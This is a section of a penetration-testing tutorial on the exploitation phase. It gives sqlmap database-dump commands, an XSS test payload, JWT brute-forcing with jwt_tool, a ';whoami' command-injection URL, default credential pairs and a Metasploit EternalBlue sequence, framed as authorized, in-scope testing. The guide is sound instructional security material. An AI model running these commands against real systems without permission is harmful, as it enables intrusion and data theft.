## ðŸ”¹ Phase 4 â€“ Exploitation

Exploitation is where recon and enumeration pay off. The goal is to gain unauthorized access, escalate privileges, or retrieve sensitive information â€” **without causing damage**. A professional pentester balances aggression with control: exploit, prove the point, and stop.

> ðŸ§  This phase is about using known vulnerabilities or misconfigurations to gain access. Exploits can be found manually or through automated tools. Proof-of-Concept (PoC) is often enough â€” you don't need to crash or destroy anything.

## ðŸ”“ Common Exploitation Targets

### ðŸ”¸ SQL Injection (SQLi)

Automated testing with `sqlmap`:

```bash
sqlmap -u "https://target.com/page.php?id=1" --batch --dbs
```

* `--batch`: no prompts, assumes default answers
* `--dbs`: enumerate available databases

More aggressive extraction:

```bash
sqlmap -u "https://target.com/page.php?id=1" --tables -D target_db --dump
```

* Dumps all data from target DB

ðŸ§  Tip: Always test with Burp first to identify parameters before using sqlmap.

### ðŸ”¸ Cross-Site Scripting (XSS)

Manual testing:

```html
<script>alert(1)</script>
```

Place in form fields, URLs, or headers.

Automated testing:

```bash
xsstrike -u https://target.com/search?q=test
```

* Detects reflective and stored XSS
* Attempts fuzzing with payloads

### ðŸ”¸ Authentication Bypass

Test for:

* Weak credentials: `admin:admin`, `root:toor`, `test:test`
* Logic flaws: login success without session token
* JWT tampering

#### `jwt-tool`:

```bash
jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... -S secret123
```

* Attempts decoding, brute-forcing, and modifying JWT tokens

### ðŸ”¸ Command Injection / RCE

Indicators:

* Parameters like `?cmd=` or `?ping=1.1.1.1`
* Use semicolons, pipes, backticks

```bash
https://target.com/ping?ip=127.0.0.1;whoami
```

ðŸ§  Always URL encode characters in GET requests.

## ðŸ§° Exploitation Tools

### ðŸ”¸ Burp Suite

* Intercept and modify requests
* Repeater for PoC replay
* Intruder for brute-force/fuzzing
* Extensions: ActiveScan++, Logger++, Collaborator (for OAST)

### ðŸ”¸ Metasploit

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target-ip
run
```

* Useful for known CVEs and post-exploitation modules

### ðŸ”¸ Exploit Databases

* [https://www.exploit-db.com](https://www.exploit-db.com)
* Search by software/version from recon phase

## ðŸ“Œ Pro Tips

* Exploit only **what's in scope** â€” never attack third-party or production systems without permission.
* Use Burp to test before automating.
* Document every finding: include request, payload, response, impact.
* Avoid DoS/overload unless explicitly allowed.
